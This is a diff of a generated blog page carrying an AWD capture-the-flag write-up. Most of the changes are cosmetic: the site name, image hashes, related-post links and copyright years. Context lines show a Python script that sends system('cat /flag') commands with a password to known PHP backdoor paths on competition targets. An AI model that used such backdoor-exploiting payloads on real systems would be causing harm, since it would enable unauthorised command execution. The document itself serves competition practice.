@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" awd 密码，原来源码在/app下面\n1 tar -zcvf /app/backup.tar.gz . 不过/home/ctf下有flag，然后d盾扫一下，4个后门\n发现/uploads/0.php有后门，\n">
 <title>2025-9-13</title>
@@ -9,7 +9,7 @@
 <link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-9-13">
 <meta property='og:description' content=" awd 密码，原来源码在/app下面\n1 tar -zcvf /app/backup.tar.gz . 不过/home/ctf下有flag，然后d盾扫一下，4个后门\n发现/uploads/0.php有后门，\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-9-13/'>
-<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:site_name' content='zhizuijimi'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-09-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-13T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-9-13">
 <meta name="twitter:description" content=" awd 密码，原来源码在/app下面\n1 tar -zcvf /app/backup.tar.gz . 不过/home/ctf下有flag，然后d盾扫一下，4个后门\n发现/uploads/0.php有后门，\n">
@@ -58,7 +58,7 @@
                     
                     
                         
-                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -71,7 +71,7 @@
         
         
         <div class="site-meta">
-            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
             <h2 class="site-description"></h2>
         </div>
     </header><ol class="menu-social">
@@ -350,7 +350,7 @@
 <p><img src="/p/2025-9-13/image-20250913204910587.png"
 	width="989"
 	height="202"
-	srcset="/p/2025-9-13/image-20250913204910587_hu_c2599c3a936f90df.png 480w, /p/2025-9-13/image-20250913204910587_hu_38bfeac53c1f3bc.png 1024w"
+	srcset="/p/2025-9-13/image-20250913204910587_hu_3a0c95d5fc53567c.png 480w, /p/2025-9-13/image-20250913204910587_hu_befd74ce149c611a.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250913204910587"
@@ -416,7 +416,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 尝试常见的 PHP 后门文件名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">possible_paths</span> <span class="o">=</span> <span class="p">[</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">possible_paths</span> <span class="o">=</span> <span class="p">[</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;/uploads/0.php&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
@@ -439,7 +439,7 @@
 <p><img src="/p/2025-9-13/image-20250913201639873.png"
 	width="470"
 	height="188"
-	srcset="/p/2025-9-13/image-20250913201639873_hu_a914edda7e8d701c.png 480w, /p/2025-9-13/image-20250913201639873_hu_32141b7d7fb00950.png 1024w"
+	srcset="/p/2025-9-13/image-20250913201639873_hu_3a3a4bcfa354ec69.png 480w, /p/2025-9-13/image-20250913201639873_hu_aa1b5363c6b217e4.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250913201639873"
@@ -504,23 +504,23 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">possible_paths</span> <span class="o">=</span> <span class="p">[</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;/system.php&#34;</span><span class="p">,</span>  <span class="c1"># 
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">]</span>
+</span></span></span><span class="line"><span class="cl"><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">base_url</span> <span class="nx">in</span> <span class="nx">urls</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="nx">path</span> <span class="nx">in</span> <span class="nx">possible_paths</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="o">=</span> <span class="nx">base_url</span> <span class="o">+</span> <span class="nx">path</span>
 </span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">:</span>
 </span></span><span class="line"><span class="cl">            <span class="c1"># 使用 params 传递 GET 参数（pwd=Aristore）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1"># 使用 data 传递 POST 参数（a=system(&#34;cat /flag&#34;)）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="o">:</span> <span class="s1">&#39;system(&#34;cat /flag&#34;)&#39;</span><span class="p">}</span>
+</span></span></span><span class="line"><span class="cl">            <span class="c1"># 使用 data 传递 POST 参数（a=system(&#34;cat /flag&#34;)）
+</span></span></span><span class="line"><span class="cl">            <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="o">:</span> <span class="s1">&#39;system(&#34;cat /flag&#34;)&#39;</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl">            <span class="nx">resp</span> <span class="o">=</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">                <span class="nx">url</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">                <span class="nx">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;pwd&#39;</span><span class="o">:</span> <span class="s1">&#39;Aristore&#39;</span><span class="p">},</span>  <span class="c1"># GET 参数
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">data</span><span class="o">=</span><span class="nx">payload</span><span class="p">,</span>                <span class="c1"># POST 数据
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">timeout</span><span class="o">=</span><span class="mi">5</span>
+</span></span></span><span class="line"><span class="cl">                <span class="nx">data</span><span class="o">=</span><span class="nx">payload</span><span class="p">,</span>                <span class="c1"># POST 数据
+</span></span></span><span class="line"><span class="cl">                <span class="nx">timeout</span><span class="o">=</span><span class="mi">5</span>
 </span></span><span class="line"><span class="cl">            <span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;==== {resp.url} ====&#34;</span><span class="p">)</span>  <span class="c1"># 打印完整的URL（包含GET参数）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;状态码: {resp.status_code}&#34;</span><span class="p">)</span>
+</span></span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">&#34;状态码: {resp.status_code}&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">(</span><span class="nx">resp</span><span class="o">.</span><span class="nx">text</span><span class="o">.</span><span class="nx">strip</span><span class="p">())</span>
 </span></span><span class="line"><span class="cl">            <span class="k">print</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">        <span class="nx">except</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">exceptions</span><span class="o">.</span><span class="nx">RequestException</span> <span class="k">as</span> <span class="nx">e</span><span class="o">:</span>
@@ -532,7 +532,7 @@
 <p><img src="/p/2025-9-13/image-20250913205043854.png"
 	width="1190"
 	height="586"
-	srcset="/p/2025-9-13/image-20250913205043854_hu_6e114e5204b53a5b.png 480w, /p/2025-9-13/image-20250913205043854_hu_7023840043347341.png 1024w"
+	srcset="/p/2025-9-13/image-20250913205043854_hu_944be001c611976b.png 480w, /p/2025-9-13/image-20250913205043854_hu_3806a1c23912297b.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250913205043854"
@@ -589,7 +589,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 尝试常见的 PHP 后门文件名
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">possible_paths</span> <span class="o">=</span> <span class="p">[</span>
+</span></span></span><span class="line"><span class="cl"><span class="nx">possible_paths</span> <span class="o">=</span> <span class="p">[</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;/controller/Action.class.php&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
@@ -661,6 +661,32 @@
             
                 
 <article class="">
+    <a href="/p/2022vnctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2022vnctf复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-ciscn%E5%88%9D%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-ciscn初赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-%E9%B9%8F%E7%A8%8B%E6%9D%AF/">
         
         
@@ -680,32 +706,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025领航杯-awdp</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/buu-awdp/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">buu-awdp</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/cc4/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">cc4</h2>
         </div>
     </a>
 </article>
@@ -770,7 +770,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
